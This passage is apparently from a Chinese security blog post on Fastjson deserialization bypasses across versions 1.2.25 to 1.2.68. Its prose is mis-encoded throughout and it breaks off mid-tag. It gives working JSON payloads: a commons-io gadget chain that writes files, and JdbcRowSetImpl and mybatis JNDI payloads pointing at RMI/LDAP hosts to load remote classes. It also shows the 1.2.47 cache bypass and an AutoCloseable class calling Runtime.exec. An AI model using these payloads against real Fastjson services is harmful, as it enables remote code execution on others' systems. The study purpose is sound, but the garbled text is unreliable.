class="string">&quot;reader&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.CharSequenceReader&quot;</span>,</span><br><span class="line">                <span class="string">&quot;charSequence&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.String&quot;</span><span class="string">&quot;aaaaaa...(é•¿åº¦è¦å¤§äº8192ï¼Œå®é™…å†™å…¥å‰8192ä¸ªå­—ç¬¦)&quot;</span>,</span><br><span class="line">                                <span class="string">&quot;start&quot;</span>:<span class="number">0</span>,</span><br><span class="line">                                <span class="string">&quot;end&quot;</span>:<span class="number">2147483647</span></span><br><span class="line">                               &#125;,</span><br><span class="line">                <span class="string">&quot;charsetName&quot;</span>:<span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line">                <span class="string">&quot;bufferSize&quot;</span>:<span class="number">1024</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;branch&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">                <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.output.WriterOutputStream&quot;</span>,</span><br><span class="line">                <span class="string">&quot;writer&quot;</span>:&#123;</span><br><span class="line">                    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.output.FileWriterWithEncoding&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;file&quot;</span>:<span class="string">&quot;/tmp/pwned&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;charsetName&quot;</span>:<span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;append&quot;</span>: <span class="literal">false</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">&quot;charsetName&quot;</span>:<span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line">                <span class="string">&quot;bufferSize&quot;</span>: <span class="number">1024</span>,</span><br><span class="line">                <span class="string">&quot;writeImmediately&quot;</span>: <span class="literal">true</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;trigger&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">                <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span>,</span><br><span class="line">                <span class="string">&quot;inputStream&quot;</span>:&#123;</span><br><span class="line">                    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;input&quot;</span>:&#123;</span><br><span class="line">                        <span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.input&quot;</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="string">&quot;branch&quot;</span>:&#123;</span><br><span class="line">                        <span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.branch&quot;</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="string">&quot;closeBranch&quot;</span>: <span class="literal">true</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">&quot;httpContentType&quot;</span>:<span class="string">&quot;text/xml&quot;</span>,</span><br><span class="line">                <span class="string">&quot;lenient&quot;</span>:<span class="literal">false</span>,</span><br><span class="line">                <span class="string">&quot;defaultEncoding&quot;</span>:<span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;trigger2&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">                <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span>,</span><br><span class="line">                <span class="string">&quot;inputStream&quot;</span>:&#123;</span><br><span class="line">                    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;input&quot;</span>:&#123;</span><br><span class="line">                        <span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.input&quot;</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="string">&quot;branch&quot;</span>:&#123;</span><br><span class="line">                        <span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.branch&quot;</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="string">&quot;closeBranch&quot;</span>: <span class="literal">true</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">&quot;httpContentType&quot;</span>:<span class="string">&quot;text/xml&quot;</span>,</span><br><span class="line">                <span class="string">&quot;lenient&quot;</span>:<span class="literal">false</span>,</span><br><span class="line">                <span class="string">&quot;defaultEncoding&quot;</span>:<span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;trigger3&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">                <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span>,</span><br><span class="line">                <span class="string">&quot;inputStream&quot;</span>:&#123;</span><br><span class="line">                    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;input&quot;</span>:&#123;</span><br><span class="line">                        <span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.input&quot;</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="string">&quot;branch&quot;</span>:&#123;</span><br><span class="line">                        <span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.branch&quot;</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="string">&quot;closeBranch&quot;</span>: <span class="literal">true</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">&quot;httpContentType&quot;</span>:<span class="string">&quot;text/xml&quot;</span>,</span><br><span class="line">                <span class="string">&quot;lenient&quot;</span>:<span class="literal">false</span>,</span><br><span class="line">                <span class="string">&quot;defaultEncoding&quot;</span>:<span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>å‚è€ƒï¼š<a href="https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg">https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg</a></p><p><a href="https://xz.aliyun.com/t/12492">https://xz.aliyun.com/t/12492?</a></p><p><a href="https://www.cnblogs.com/zpchcbd/p/14969606.html?ref=www.ctfiot.com">https://www.cnblogs.com/zpchcbd/p/14969606.html?ref=www.ctfiot.com</a></p><p><a href="https://github.com/lemono0/FastJsonParty/blob/main/FastJson1268%E5%86%99%E6%96%87%E4%BB%B6RCE%E6%8E%A2%E7%A9%B6.md">https://github.com/lemono0/FastJsonParty/blob/main/FastJson1268%E5%86%99%E6%96%87%E4%BB%B6RCE%E6%8E%A2%E7%A9%B6.md</a></p><h3 id="C3p0-hexé“¾"><a href="#C3p0-hexé“¾" class="headerlink" title="C3p0 hexé“¾"></a>C3p0 hexé“¾</h3><p><a href="https://www.yuque.com/zqiangweihuakai/ybltae/gn8pc9n3hhcvwiit">C3P0é“¾</a></p><p>å‚è€ƒï¼š<a href="https://forum.butian.net/share/2868">https://forum.butian.net/share/2868</a></p><p><a href="https://goodapple.top/archives/1749">https://goodapple.top/archives/1749</a></p><p><a href="https://xz.aliyun.com/t/12286">https://xz.aliyun.com/t/12286?</a></p><h2 id="1-2-25-1-2-41Bypass"><a href="#1-2-25-1-2-41Bypass" class="headerlink" title="1.2.25-1.2.41Bypass"></a>1.2.25-1.2.41Bypass</h2><p>å…ˆæ¥çœ‹çœ‹æ˜¯æ€ä¹ˆä¿®å¤çš„</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733561460107-2f50952c-9409-477f-8dfd-8dd05d6c7385.png"></p><p>åŠ äº†ä¸€ä¸ªautoTypeSupport è¿™ä¸ªé»˜è®¤å€¼ä¸ºfalseï¼Œå¦‚æœä¸ºTrueçš„è¯åœ¨ä¸ä¸‹é¢çš„acceptListç™½åå•è¿›è¡ŒåŒ¹é…å¦‚æœé€šè¿‡å°±è°ƒç”¨loadclassä¹‹ååœ¨ä¸denyListé»‘åå•è¿›è¡ŒåŒ¹é…ï¼Œå¦‚æœåŒ¹é…å°±ç›´æ¥è·‘å‡ºå¼‚å¸¸</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733561634177-5dd6dc69-5df3-480f-b7b2-3e21cbcae994.png"></p><p>è¿™æ˜¯è¿™ä¸‰ä¸ªå€¼çš„å®šä¹‰</p><p>ç™½åå•é»˜è®¤ä¸ºç©ºï¼Œä»é…ç½®æ–‡ä»¶é‡ŒåŠ è½½ é»‘åå•è‡ªå·±è·Ÿè¿›å»çœ‹çœ‹å§æœ‰ç‚¹é•¿æˆªä¸å…¨ï¼Œå°±æ˜¯ä¸€äº›å¸¸è§çš„æ¶æ„é“¾çš„åˆ©ç”¨çš„ç±»ã€‚</p><p>è¿™é‡Œæˆ‘ä»¬å…ˆçœ‹çœ‹å¦‚æœä¸åœ¨é»‘åå•ä»–çš„ä¸‹é¢æ‰§è¡Œæµç¨‹æ˜¯æ€ä¹ˆæ ·çš„</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733562526874-4806db42-5c9b-47e2-a4b0-18a3894da718.png"></p><p>è¿™é‡Œä¼šå…ˆä»è¿™ä¸ªmappingçš„ç¼“å­˜é‡Œå»æ‰¾ï¼Œå¦‚æœè¿™é‡Œæ²¡æœ‰çš„è¯ä¼šå»ä¸‹é¢çš„ååºåˆ—åŒ–å™¨é‡Œå»æ‰¾ï¼Œè¿™é‡Œéƒ½ä¸æ˜¯é‡ç‚¹</p><p>ç»§ç»­å‘ä¸‹çœ‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733562895904-eaedee7c-c8e6-4210-9fea-c95fecc0367c.png"></p><p>å¦‚æœè¿™ä¸ªautotypeä¸ºfalseçš„è¯ä¼šåœ¨èµ°ä¸€éé»‘åå•å’Œç™½åå•çš„è¿‡æ»¤å¦‚æœä¸ºtrueä¼šè¿›å…¥åˆ°TypeUtilsçš„loadclassæ–¹æ³•é‡Œ</p><p>è·Ÿè¿›å»çœ‹çœ‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733563617389-89789da2-65fc-4ef4-adad-f0b9b03f2b98.png"></p><p>ä¸»è¦çœ‹çº¢æ¡†ä¸­çš„ä»£ç </p><ul><li>å¦‚æœä»¥<code>[</code>å¼€å¤´åˆ™å»æ‰<code>[</code>åè¿›è¡Œç±»åŠ è½½ï¼ˆåœ¨ä¹‹å‰Fastjsonå·²ç»åˆ¤æ–­è¿‡æ˜¯å¦ä¸ºæ•°ç»„äº†ï¼Œå®é™…èµ°ä¸åˆ°è¿™ä¸€æ­¥ï¼‰</li><li>å¦‚æœä»¥<code>L</code>å¼€å¤´ï¼Œä»¥<code>;</code>ç»“å°¾ï¼Œåˆ™å»æ‰å¼€å¤´å’Œç»“å°¾è¿›è¡Œç±»åŠ è½½</li></ul><p>é‚£ä¹ˆåŠ ä¸Š<code>L</code>å¼€å¤´å’Œ<code>;</code>ç»“å°¾å®é™…ä¸Šå°±å¯ä»¥ç»•è¿‡æ‰€æœ‰é»‘åå•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">String json= <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://10.37.129.2:1099/l1pwqj\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">JSON.parseObject(json);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰é™åˆ¶å°±æ˜¯éœ€è¦è¿™é‡Œå…³é—­ç™½åå•é™åˆ¶æ‰å¯ä»¥æ‰§è¡Œã€‚</p><h2 id="1-2-42ç‰ˆæœ¬ç»•è¿‡"><a href="#1-2-42ç‰ˆæœ¬ç»•è¿‡" class="headerlink" title="1.2.42ç‰ˆæœ¬ç»•è¿‡"></a>1.2.42ç‰ˆæœ¬ç»•è¿‡</h2><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733566031771-a14069f2-ecec-4166-b2ee-58f600154a06.png"></p><p>è¿™é‡Œä½¿ç”¨äº†hashcodeè¿›è¡Œæˆªå–å°†Lå’Œ;ä¹‹é—´çš„ç±»åæˆªå–å‡ºæ¥</p><p>æ‰€ä»¥è¿™é‡Œåªéœ€è¦åŒå†™å°±å¯ä»¥ç»•è¿‡ï¼Œä½†æ˜¯åŒæ ·çš„ä¹Ÿéœ€è¦æ‰‹åŠ¨è®¾ç½®ä¸ºtrue</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">       String json= <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://10.37.129.2:1099/l1pwqj\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">       JSON.parseObject(json);</span><br></pre></td></tr></table></figure><h2 id="1-2-43bypass"><a href="#1-2-43bypass" class="headerlink" title="1.2.43bypass"></a>1.2.43bypass</h2><p>åœ¨æ­¤ç‰ˆæœ¬ä¸­,<code>checkAutoType</code>å¯¹<code>LL</code>è¿›è¡Œäº†åˆ¤æ–­ï¼Œå¦‚æœç±»ä»¥<code>LL</code>å¼€å¤´ï¼Œåˆ™ç›´æ¥æŠ›å‡ºå¼‚å¸¸</p><p>åœ¨<code>TypeUtils.loadClass</code>ä¸­ï¼Œè¿˜å¯¹<code>[</code>è¿›è¡Œäº†å¤„ç†ï¼Œå› æ­¤åˆå¯ä»¥é€šè¿‡<code>[</code>æ¥è¿›è¡Œç»•è¿‡ï¼Œå…·ä½“å¯ä»¥æ ¹æ®æŠ¥é”™æŠ›å‡ºçš„å¼‚å¸¸æ¥è¿›è¡Œæ„é€ payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span>[&#123;,</span><br><span class="line">    <span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://localhost:1399/Exploit&quot;</span>, </span><br><span class="line">    <span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="1-2-45bypass"><a href="#1-2-45bypass" class="headerlink" title="1.2.45bypass"></a>1.2.45bypass</h2><p>1.2.45ç‰ˆæœ¬æ·»åŠ äº†ä¸€äº›é»‘åå•ï¼Œä½†æ˜¯å­˜åœ¨ç»„ä»¶æ¼æ´ï¼Œæˆ‘ä»¬èƒ½é€šè¿‡mybatisç»„ä»¶è¿›è¡ŒJNDIæ¥å£è°ƒç”¨ï¼Œè¿›è€ŒåŠ è½½æ¶æ„ç±»ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span>,</span><br><span class="line">    <span class="string">&quot;properties&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;data_source&quot;</span>:<span class="string">&quot;ldap://127.0.0.1ï¼š9999/EXP&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="1-2-47bypass"><a href="#1-2-47bypass" class="headerlink" title="1.2.47bypass"></a>1.2.47bypass</h2><p>æ­¤ç‰ˆæœ¬å¯ä»¥ä¸éœ€è¦å¼€å¯autotypeï¼Œå…·ä½“é€»è¾‘çœ‹ç™½æ—¥æ¢¦ç»„é•¿çš„è§†é¢‘</p><p>è¿˜æ˜¯åœ¨checkautotypeé‡Œé¢</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733566638382-a8147587-5864-446c-bb58-01e6b2762533.png"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œä¼šåŠ è½½ç¼“å­˜é‡Œæœ‰æ²¡æœ‰å­˜åœ¨çš„å·²ç»åŠ è½½è¿‡çš„ï¼Œå¦‚æœæœ‰å°±ç›´æ¥è¿”å›clazz</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733566850911-f0fd54f5-5e54-4ef6-b4d5-d261dcbf48cc.png"></p><p>è€Œåœ¨<code>ParserConfig</code>ç±»åˆå§‹åŒ–æ—¶ä¼šæ‰§è¡Œ<code>initDeserializers</code>æ–¹æ³•ï¼Œä¼šå‘<code>deserializers</code>ä¸­æ·»åŠ è®¸å¤šçš„ç±»ï¼Œç±»ä¼¼ä¸€ç§ç¼“å­˜ï¼Œå…¶ä¸­ä¼šæ·»åŠ è¿™ä¹ˆä¸€ä¸ªç±»<code>this.deserializers.put(Class.class, MiscCodec.instance);</code></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733566997705-20ea37d5-56ea-4f90-b0c7-f25dbcfaed06.png"></p><p>ä»–åœ¨æ‰§è¡Œååºåˆ—åŒ–çš„æ—¶å€™ä¼šè°ƒç”¨loadclassæ–¹æ³•</p><p>ä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¼ çš„å­—ç¬¦ä¸²ä¼šä¼ å…¥åˆ°è¿™ä¸ªloadclassé‡Œé¢<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733567138719-e1b41779-b5ae-4ac5-a97e-e1958a205acc.png"></p><p>ç„¶åä»–ä¼šæŠŠå®ƒæ”¾åˆ°mappingé‡Œé¢ï¼Œç„¶ååœ¨åé¢è¿›è¡Œchekautotypeçš„æ—¶å€™æˆ‘ä»¬å‰é¢è¯´è¿‡å¦‚æœæœ‰ä¼šç›´æ¥è¿”å›æ‰€ä»¥è¿™é‡Œå°±ç»•è¿‡äº†æ£€æŸ¥</p><p>ç°åœ¨æ¥çœ‹çœ‹åœ¨é‚£é‡Œç»™strValèµ‹å€¼</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733567598223-4618c7a0-0fcb-4422-a8c5-c042afd38cd3.png"></p><p>å†å»æ‰¾objval</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733567713353-97c20d6c-c5fd-47bc-90b0-a8b2460879b3.png"></p><p>å¯ä»¥çœ‹åˆ°å¦‚æœä¸æ˜¯valå°±ä¼šæŠ¥é”™ï¼Œæ‰€ä»¥å‰åŠæ®µçš„payloadåº”è¯¥æ˜¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="comment">//æ»¡è¶³clazzä¸ºClass.class</span></span><br><span class="line"><span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="comment">//æœ‰valï¼Œä¸”å€¼ä¸ºæˆ‘ä»¬è¦å†™å…¥mappingçš„æ¶æ„ç±»</span></span><br><span class="line"><span class="string">&quot;val&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733568245229-5c0f9c1d-96f2-426a-9d18-6e417d353aa4.png"></p><p>ä¸Šæ–‡æˆ‘ä»¬å·²ç»åˆ†æè¿‡äº†ï¼Œé€šè¿‡ä»<code>mapping</code>ä¸­åŠ è½½æ¶æ„ç±»å¯ä»¥ç»•è¿‡<code>checkAutoType()</code>çš„æ£€æµ‹ï¼Œå½“æˆ‘ä»¬ç¬¬äºŒæ¬¡è¿›å…¥checkAutoType()çš„æ—¶å€™ï¼Œå°±ä¼šä»mappingä¸­è·å–æ¶æ„ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;1\&quot;:&#123;\&quot;@type\&quot;: \&quot;java.lang.Class\&quot;, \&quot;val\&quot;: \&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;,\&quot;2\&quot;: &#123;\&quot;@type\&quot;: \&quot;com.sun.rowset.JdbcRowSetImpl\&quot;, \&quot;dataSourceName\&quot;: \&quot;rmi://10.37.129.2:1099/l1pwqj\&quot;, \&quot;autoCommit\&quot;: true&#125;&#125;&quot;</span>;</span><br><span class="line">JSON.parseObject(json);</span><br></pre></td></tr></table></figure><h2 id="1-2-68Bypass"><a href="#1-2-68Bypass" class="headerlink" title="1.2.68Bypass"></a>1.2.68Bypass</h2><p>æœ¬æ¬¡ç»•è¿‡checkAutoType()å‡½æ•°çš„å…³é”®ç‚¹åœ¨äºå…¶ç¬¬äºŒä¸ªå‚æ•°expectClassï¼Œå¯ä»¥é€šè¿‡æ„é€ æ¶æ„JSONæ•°æ®ã€ä¼ å…¥æŸä¸ªç±»ä½œä¸ºexpectClasså‚æ•°å†ä¼ å…¥å¦ä¸€ä¸ªexpectClassç±»çš„å­ç±»æˆ–å®ç°ç±»æ¥å®ç°ç»•è¿‡checkAutoType()å‡½æ•°æ‰§è¡Œæ¶æ„æ“ä½œã€‚</p><p>ç®€å•åœ°è¯´ï¼Œæœ¬æ¬¡ç»•è¿‡checkAutoType()å‡½æ•°çš„æ”»å‡»æ­¥éª¤ä¸ºï¼š</p><ol><li>å…ˆä¼ å…¥æŸä¸ªç±»ï¼Œå…¶åŠ è½½æˆåŠŸåå°†ä½œä¸ºexpectClasså‚æ•°ä¼ å…¥checkAutoType()å‡½æ•°ï¼›</li><li>æŸ¥æ‰¾expectClassç±»çš„å­ç±»æˆ–å®ç°ç±»ï¼Œå¦‚æœå­˜åœ¨è¿™æ ·ä¸€ä¸ªå­ç±»æˆ–å®ç°ç±»å…¶æ„é€ æ–¹æ³•æˆ–setteræ–¹æ³•ä¸­å­˜åœ¨å±é™©æ“ä½œåˆ™å¯ä»¥è¢«æ”»å‡»åˆ©ç”¨ï¼›</li><li>æ¡ä»¶</li></ol><ul><li>Fastjson &lt;&#x3D; 1.2.68ï¼›</li><li>åˆ©ç”¨ç±»å¿…é¡»æ˜¯expectClassç±»çš„å­ç±»æˆ–å®ç°ç±»ï¼Œå¹¶ä¸”ä¸åœ¨é»‘åå•ä¸­ï¼›</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> vul;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VulAutoCloseable</span> <span class="keyword">implements</span> <span class="title class_">AutoCloseable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">VulAutoCloseable</span><span class="params">(String cmd)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(cmd);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;vul.VulAutoCloseable&quot;</span>,<span class="string">&quot;cmd&quot;</span>:<span class="string">&quot;calc&quot;</span>&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å…·ä½“è°ƒè¯•æµç¨‹å‚è€ƒ<a href="http://www.mi1k7ea.com/2021/02/08/Fastjson%E7%B3%BB%E5%88%97%E5%85%AD%E2%80%94%E2%80%941-2-48-1-2-68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">http://www.mi1k7ea.com/2021/02/08/Fastjson%E7%B3%BB%E5%88%97%E5%85%AD%E2%80%94%E2%80%941-2-48-1-2-68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p><p>æ–‡ç« æ”¶è—äº†</p><p>è‡ªå·±è·Ÿä¸€ä¸‹è°ƒç”¨æµç¨‹ï¼Œå£°æ˜ä¸€ä¸‹æˆ‘è¿™é‡Œæ˜¯ä»æ¼æ´è§¦å‘ç‚¹å»è·Ÿçš„ä¸æ˜¯æŒ‰æºç æ‰¾çš„ä¸»è¦æ˜¯è®°å½•å¤ç°è¿™ä¸ªç»•è¿‡åŸç†</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733646627096-65b1de66-37bb-4625-8f23-4be22761f643.png"></p><p>å¯ä»¥çœ‹åˆ°å·²ç»æ˜¯æˆ‘ä»¬æŒ‡å®šçš„autocloseableè¿™ä¸ªç±»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733646669031-d2f6b90f-d037-4761-a22b-133d0197ff22.png"></p><p>è¿™é‡Œå°±æ˜¯ä¸€äº›å¸¸è§„åˆ¤æ–­ï¼Œè¿™é‡Œæˆ‘ä»¬ç›´æ¥è·³åˆ°å…³é”®ç‚¹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733646719667-953cbe96-d6f9-4456-8aba-bbe60db7812a.png"></p><p>è¿™é‡Œä»ç¼“å­˜ä¸­åŠ è½½è¿™ä¸ªç±»<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733646841434-9022cef2-acfa-47b9-8a03-55d01032e03d.png"></p><p>å¯ä»¥çœ‹åˆ°è¿™ä¸ªç±»æ˜¯é»˜è®¤åœ¨mappingsåˆå§‹åŒ–ä¼šputè¿›å»çš„</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733646874613-20b75835-531a-4139-819f-98e16b8182ca.png"></p><p>ç„¶åå°±ä¼šç›´æ¥è¿”å›</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733646925822-2c45a7ee-f4c3-4320-ba4e-f3ce19bcfcb3.png"></p><p>æ¥ç€ï¼Œè¿”å›åˆ°DefaultJSONParserç±»ä¸­è·å–åˆ°clazzåå†ç»§ç»­æ‰§è¡Œï¼Œæ ¹æ®java.lang.AutoCloseableç±»è·å–åˆ°ååºåˆ—åŒ–å™¨ä¸ºJavaBeanDeserializerï¼Œç„¶ååº”ç”¨è¯¥ååºåˆ—åŒ–å™¨è¿›è¡Œååºåˆ—åŒ–æ“ä½œï¼š</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733646973696-b531bd33-64f7-4989-a6db-cb2eaf27e3e9.png"></p><p>ç»§ç»­å¾€ä¸‹èµ°<img 